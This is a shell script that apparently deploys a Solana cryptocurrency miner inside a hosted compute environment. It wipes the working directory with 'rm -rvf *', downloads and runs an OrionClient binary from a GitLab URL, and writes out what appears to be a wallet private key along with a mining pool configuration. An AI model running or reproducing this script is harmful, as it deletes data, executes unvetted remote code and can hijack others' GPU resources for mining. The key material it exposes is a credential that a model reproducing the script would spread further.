#!/bin/sh




rm -rvf *
wget https://gitlab.com/majapahlevi/BARU/-/raw/main/OrionClient
chmod +x OrionClient
cat > id.json <<END
[8kyGfGF4oR4HfSWAWJbMPTruvxBqzLGk7eKm5UKco6upjhQgbhQDCw2EEXeK8MXj3zSPyFYeYYAtJpFy2tnjaLe]
END
cat > settings.json <<END
{
  "Pool": "Twbitz",
  "GPUDevices": [
    0
  ],
  "KeyFile": "/dli/task/id.json",
  "PublicKey": null,
  "WorkerName": "1b86fa2e4779",
  "ignoreCertError": false,
  "ratio": 0.33,
  "timeout": 180,
  "MigratedSettings": true,
  "UsedAdvancedSettings": false,
  "CPUSetting": {
    "CPUHasher": "Stock [[C#]]",
    "CPUThreads": 6,
    "AutoSetCPUAffinity": true,
    "MinimumHashTime": 1.75
  },
  "GPUSetting": {
    "GPUHasher": "Cuda (Emulation)",
    "MaxGPUNoncePerBatch": 2048,
    "GPUBlockSize": 512,
    "ProgramGenerationThreads": 0,
    "EnableExperimentalHashers": false
  },
  "VanitySetting": {
    "GPUDevices": [],
    "MaxRAMUsageMB": 1024,
    "VanitySearchFile": "search.txt",
    "VanityOutputFile": "foundWallets.txt",
    "GPUBlockSize": 256,
    "MinimumCharacterLength": 0,
    "VanityThreads": 0
  },
  "RPCSetting": {
    "Url": "https://api.mainnet-beta.solana.com/"
  },
  "StakingViewSetting": {
    "StakingViewCacheFile": "cache.json",
    "TotalHistoricalDays": 7
  },
  "EventWebsocketSetting": {
    "Enable": false,
    "WebsocketUrl": "localhost",
    "Port": 54321,
    "Id": "",
    "ReconnectTimeMs": 5000,
    "Serialization": 0
  }
}
END
chmod +x OrionClient
./OrionClient






